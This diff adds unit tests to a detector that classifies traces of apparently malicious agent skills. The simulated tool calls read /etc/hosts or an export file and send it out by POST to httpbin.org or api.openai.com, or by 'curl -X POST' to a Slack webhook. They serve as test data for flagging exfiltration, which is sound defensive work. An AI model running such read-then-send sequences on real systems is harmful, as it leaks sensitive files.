@@ -209,6 +209,236 @@ class DynamicDecisionRegressionTests(unittest.TestCase):
         self.assertEqual(result["final_decision"], "benign")
         self.assertEqual(result["root_cause_detail"], "unknown")
 
+    def test_http_request_url_is_preferred_over_unknown_network_sink(self) -> None:
+        execution = _execution(
+            skill_dir=DATASETS_ROOT / "malicious" / "malicious_sensitive_exfil_direct",
+            file_events=[
+                FileEvent(timestamp="2026-01-01T00:00:01Z", path="/etc/hosts", action="read", raw="read"),
+            ],
+            network_events=[
+                NetworkEvent(timestamp="2026-01-01T00:00:02Z", address="unknown", action="connect", raw="connect"),
+            ],
+            process_events=[],
+            tool_calls=[
+                _tool_call("2026-01-01T00:00:00Z", "read_sensitive_hosts", "Read Sensitive Hosts", "read_file", {"path": "/etc/hosts"}),
+                _tool_call("2026-01-01T00:00:01Z", "send_hosts", "Send Hosts", "http_request", {"method": "POST", "url": "https://httpbin.org/post"}),
+            ],
+        )
+
+        result = analyze_trace(execution, analysis_mode="rule_plus_epg")
+
+        sink = result["primary_chain"][-1]
+        self.assertEqual(sink["node_type"], "network_endpoint")
+        self.assertEqual(sink["label"], "https://httpbin.org/post")
+        self.assertEqual(sink["endpoint_role"], "sink")
+        self.assertEqual(sink["sink_resolution_status"], "resolved")
+
+    def test_llm_provider_endpoint_becomes_relay_with_unknown_sink(self) -> None:
+        execution = _execution(
+            skill_dir=DATASETS_ROOT / "malicious" / "malicious_sensitive_exfil_direct",
+            file_events=[
+                FileEvent(timestamp="2026-01-01T00:00:01Z", path="/etc/hosts", action="read", raw="read"),
+            ],
+            network_events=[
+                NetworkEvent(timestamp="2026-01-01T00:00:02Z", address="unknown", action="connect", raw="connect"),
+            ],
+            process_events=[],
+            tool_calls=[
+                _tool_call("2026-01-01T00:00:00Z", "read_sensitive_hosts", "Read Sensitive Hosts", "read_file", {"path": "/etc/hosts"}),
+                _tool_call("2026-01-01T00:00:01Z", "send_hosts", "Send Hosts", "http_request", {"method": "POST", "url": "https://api.openai.com/v1/responses"}),
+            ],
+        )
+
+        result = analyze_trace(execution, analysis_mode="rule_plus_epg")
+
+        self.assertGreaterEqual(len(result["primary_chain"]), 3)
+        llm_relay = result["primary_chain"][-2]
+        sink = result["primary_chain"][-1]
+        self.assertEqual(llm_relay["node_type"], "network_endpoint")
+        self.assertEqual(llm_relay["label"], "https://api.openai.com/v1/responses")
+        self.assertEqual(llm_relay["endpoint_role"], "relay")
+        self.assertTrue(llm_relay["is_llm_provider"])
+        self.assertEqual(llm_relay["llm_provider_name"], "openai")
+        self.assertEqual(sink["node_type"], "network_endpoint")
+        self.assertEqual(sink["label"], "unknown")
+        self.assertEqual(sink["endpoint_role"], "sink")
+        self.assertEqual(sink["sink_resolution_status"], "llm-mediated")
+
+    def test_run_command_network_keeps_readable_endpoint_label(self) -> None:
+        execution = _execution(
+            skill_dir=DATASETS_ROOT / "malicious" / "malicious_unauthorized_network_transfer",
+            file_events=[
+                FileEvent(timestamp="2026-01-01T00:00:00Z", path="runtime_output/export.txt", action="write", raw="write"),
+                FileEvent(timestamp="2026-01-01T00:00:01Z", path="runtime_output/export.txt", action="read", raw="read"),
+            ],
+            network_events=[
+                NetworkEvent(timestamp="2026-01-01T00:00:02Z", address="unknown", action="connect", raw="connect", pid="321"),
+            ],
+            process_events=[
+                ProcessEvent(timestamp="2026-01-01T00:00:02Z", action="execve", command="curl -X POST https://hooks.slack.com/services/T000/B000/XXX", raw="execve", pid="321"),
+            ],
+            tool_calls=[
+                _tool_call("2026-01-01T00:00:00Z", "write_export", "Write Export", "write_file", {"path": "runtime_output/export.txt"}),
+                _tool_call("2026-01-01T00:00:01Z", "send_export", "Send Export", "run_command", {"shell": True, "command": "curl -X POST https://hooks.slack.com/services/T000/B000/XXX"}),
+            ],
+        )
+
+        result = analyze_trace(execution, analysis_mode="rule_plus_epg")
+
+        sink = result["primary_chain"][-1]
+        self.assertEqual(sink["node_type"], "network_endpoint")
+        self.assertEqual(sink["label"], "https://hooks.slack.com/services/T000/B000/XXX")
+
+    def test_dns_domain_is_preferred_over_controlled_sink_ip(self) -> None:
+        execution = _execution(
+            skill_dir=DATASETS_ROOT / "malicious" / "malicious_unauthorized_network_transfer",
+            file_events=[
+                FileEvent(timestamp="2026-01-01T00:00:00Z", path="runtime_output/export.txt", action="write", raw="write"),
+                FileEvent(timestamp="2026-01-01T00:00:01Z", path="runtime_output/export.txt", action="read", raw="read"),
+            ],
+            network_events=[
+                NetworkEvent(
+                    timestamp="2026-01-01T00:00:02Z",
+                    address="10.255.255.254:53",
+                    action="connect",
+                    raw="connect",
+                    host="10.255.255.254",
+                    port=53,
+                    raw_address="10.255.255.254:53",
+                    raw_host="10.255.255.254",
+                    raw_port=53,
+                    original_domain="api.example.com",
+                    network_evidence_sources=["dns"],
+                ),
+            ],
+            process_events=[
+                ProcessEvent(timestamp="2026-01-01T00:00:02Z", action="execve", command="python uploader.py", raw="execve", pid="321"),
+            ],
+            tool_calls=[
+                _tool_call("2026-01-01T00:00:00Z", "write_export", "Write Export", "write_file", {"path": "runtime_output/export.txt"}),
+                _tool_call("2026-01-01T00:00:01Z", "send_export", "Send Export", "run_command", {"shell": True, "command": "python uploader.py"}),
+            ],
+        )
+
+        result = analyze_trace(execution, analysis_mode="rule_plus_epg")
+
+        sink = result["primary_chain"][-1]
+        self.assertEqual(sink["node_type"], "network_endpoint")
+        self.assertEqual(sink["label"], "domain: api.example.com")
+        self.assertEqual(sink["sink_type"], "dns_only")
+        self.assertEqual(sink["sink_raw_ip"], "10.255.255.254")
+        self.assertEqual(sink["sink_resolution_status"], "resolved")
+
+    def test_controlled_sink_ip_becomes_unresolved_network_label(self) -> None:
+        execution = _execution(
+            skill_dir=DATASETS_ROOT / "malicious" / "malicious_unauthorized_network_transfer",
+            file_events=[
+                FileEvent(timestamp="2026-01-01T00:00:00Z", path="runtime_output/export.txt", action="write", raw="write"),
+                FileEvent(timestamp="2026-01-01T00:00:01Z", path="runtime_output/export.txt", action="read", raw="read"),
+            ],
+            network_events=[
+                NetworkEvent(
+                    timestamp="2026-01-01T00:00:02Z",
+                    address="10.255.255.254:53",
+                    action="connect",
+                    raw="connect",
+                    host="10.255.255.254",
+                    port=53,
+                    raw_address="10.255.255.254:53",
+                    raw_host="10.255.255.254",
+                    raw_port=53,
+                ),
+            ],
+            process_events=[
+                ProcessEvent(timestamp="2026-01-01T00:00:02Z", action="execve", command="python uploader.py", raw="execve", pid="321"),
+            ],
+            tool_calls=[
+                _tool_call("2026-01-01T00:00:00Z", "write_export", "Write Export", "write_file", {"path": "runtime_output/export.txt"}),
+                _tool_call("2026-01-01T00:00:01Z", "send_export", "Send Export", "run_command", {"shell": True, "command": "python uploader.py"}),
+            ],
+        )
+
+        result = analyze_trace(execution, analysis_mode="rule_plus_epg")
+
+        sink = result["primary_chain"][-1]
+        self.assertEqual(sink["node_type"], "network_endpoint")
+        self.assertEqual(sink["label"], "network:unresolved")
+        self.assertEqual(sink["sink_type"], "blackhole")
+        self.assertTrue(sink["is_controlled_sink"])
+        self.assertEqual(sink["sink_raw_ip"], "10.255.255.254")
+        self.assertEqual(sink["sink_resolution_status"], "controlled")
+
+    def test_sensitive_source_to_controlled_sink_stays_malicious(self) -> None:
+        execution = _execution(
+            skill_dir=DATASETS_ROOT / "malicious" / "malicious_sensitive_exfil_direct",
+            file_events=[
+                FileEvent(timestamp="2026-01-01T00:00:01Z", path="/etc/hosts", action="read", raw="read"),
+            ],
+            network_events=[
+                NetworkEvent(
+                    timestamp="2026-01-01T00:00:02Z",
+                    address="10.255.255.254:53",
+                    action="connect",
+                    raw="connect",
+                    host="10.255.255.254",
+                    port=53,
+                    raw_address="10.255.255.254:53",
+                    raw_host="10.255.255.254",
+                    raw_port=53,
+                    pid="321",
+                ),
+            ],
+            process_events=[
+                ProcessEvent(timestamp="2026-01-01T00:00:02Z", action="execve", command="curl payload", raw="execve", pid="321"),
+            ],
+            tool_calls=[
+                _tool_call("2026-01-01T00:00:00Z", "read_sensitive_hosts", "Read Sensitive Hosts", "read_file", {"path": "/etc/hosts"}),
+                _tool_call("2026-01-01T00:00:01Z", "send_hosts", "Send Hosts", "run_command", {"shell": True, "command": "curl payload"}),
+            ],
+        )
+
+        result = analyze_trace(execution, analysis_mode="rule_plus_epg")
+
+        self.assertEqual(result["final_decision"], "malicious")
+        self.assertEqual(result["risk_score"], 80)
+        self.assertIn("network_access", result["detected_behaviors"])
+        self.assertIn("read_then_exfiltration", result["detected_behaviors"])
+        self.assertEqual(result["sink_assessment"]["sink_display_label"], "network:unresolved")
+        self.assertEqual(result["sink_assessment"]["sink_resolution_status"], "controlled")
+        self.assertTrue(result["sink_assessment"]["is_controlled_sink"])
+        self.assertEqual(result["sink_assessment"]["sink_domain"], "")
+        self.assertEqual(result["sink_assessment"]["sink_url"], "")
+        self.assertTrue(
+            any(factor["code"] == "high_sensitivity_source_to_external_sink" for factor in result["triggered_factors"])
+        )
+
+    def test_sensitive_source_to_llm_mediated_unresolved_sink_stays_malicious(self) -> None:
+        execution = _execution(
+            skill_dir=DATASETS_ROOT / "malicious" / "malicious_sensitive_exfil_direct",
+            file_events=[
+                FileEvent(timestamp="2026-01-01T00:00:01Z", path="/etc/hosts", action="read", raw="read"),
+            ],
+            network_events=[
+                NetworkEvent(timestamp="2026-01-01T00:00:02Z", address="unknown", action="connect", raw="connect"),
+            ],
+            process_events=[],
+            tool_calls=[
+                _tool_call("2026-01-01T00:00:00Z", "read_sensitive_hosts", "Read Sensitive Hosts", "read_file", {"path": "/etc/hosts"}),
+                _tool_call("2026-01-01T00:00:01Z", "send_hosts", "Send Hosts", "http_request", {"method": "POST", "url": "https://api.openai.com/v1/responses"}),
+            ],
+        )
+
+        result = analyze_trace(execution, analysis_mode="rule_plus_epg")
+
+        self.assertEqual(result["final_decision"], "malicious")
+        self.assertEqual(result["risk_score"], 80)
+        self.assertEqual(result["sink_assessment"]["semantics"], "LLM_MEDIATED_UNKNOWN_SINK")
+        self.assertEqual(result["sink_assessment"]["sink_resolution_status"], "llm-mediated")
+        self.assertEqual(result["sink_assessment"]["relay_label"], "https://api.openai.com/v1/responses")
+        self.assertTrue(
+            any(factor["code"] == "high_sensitivity_source_to_external_sink" for factor in result["triggered_factors"])
+        )
+
     def test_templated_command_misuse_still_alerts(self) -> None:
         execution = _execution(
             skill_dir=DATASETS_ROOT / "malicious" / "malicious_command_exec_misuse",
